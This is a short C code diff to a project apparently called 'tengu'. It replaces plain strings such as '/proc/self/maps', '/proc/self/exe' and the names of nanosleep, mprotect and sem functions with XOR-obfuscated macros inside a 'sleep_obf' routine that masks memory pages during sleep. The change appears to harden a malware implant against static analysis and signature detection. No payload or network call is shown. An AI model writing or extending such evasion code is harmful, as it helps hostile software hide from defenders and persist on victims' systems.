@@ -27,6 +27,7 @@
 #include <sys/mman.h>
 
 #include "tengu.h"
+#include "obfstr.h"
 
 #define MAX_SEGS  64
 #define PG        4096ul
@@ -71,7 +72,7 @@ static void* sleep_thread(void* arg) {
 // Splits segments around [skip_lo, skip_hi) to leave the obf pages intact.
 static int collect_segs(Seg out[], int max, uintptr_t skip_lo, uintptr_t skip_hi,
                          const char* self) {
-    FILE* f = fopen("/proc/self/maps", "r");
+    FILE* f = fopen(SXOR(SXOR_PROC_MAPS), "r");
     if (!f) return 0;
     int   n = 0;
     char  line[512], name[256];
@@ -111,7 +112,7 @@ void sleep_obf(unsigned int secs) {
     uintptr_t skip_hi = PG_UP((uintptr_t)obf_end);
 
     char self[512];
-    ssize_t sl = readlink("/proc/self/exe", self, sizeof(self) - 1);
+    ssize_t sl = readlink(SXOR(SXOR_PROC_EXE), self, sizeof(self) - 1);
     if (sl <= 0) { sleep(secs); return; }
     self[sl] = '\0';
 
@@ -119,10 +120,10 @@ void sleep_obf(unsigned int secs) {
     if (!c) { sleep(secs); return; }
 
     c->secs         = secs;
-    c->fn_nanosleep = dlsym(RTLD_DEFAULT, "nanosleep");
-    c->fn_mprotect  = dlsym(RTLD_DEFAULT, "mprotect");
-    c->fn_sem_post  = dlsym(RTLD_DEFAULT, "sem_post");
-    c->fn_sem_wait  = dlsym(RTLD_DEFAULT, "sem_wait");
+    c->fn_nanosleep = dlsym(RTLD_DEFAULT, SXOR(SXOR_NANOSLEEP));
+    c->fn_mprotect  = dlsym(RTLD_DEFAULT, SXOR(SXOR_MPROTECT));
+    c->fn_sem_post  = dlsym(RTLD_DEFAULT, SXOR(SXOR_SEM_POST));
+    c->fn_sem_wait  = dlsym(RTLD_DEFAULT, SXOR(SXOR_SEM_WAIT));
 
     if (!c->fn_nanosleep || !c->fn_mprotect ||
         !c->fn_sem_post  || !c->fn_sem_wait)
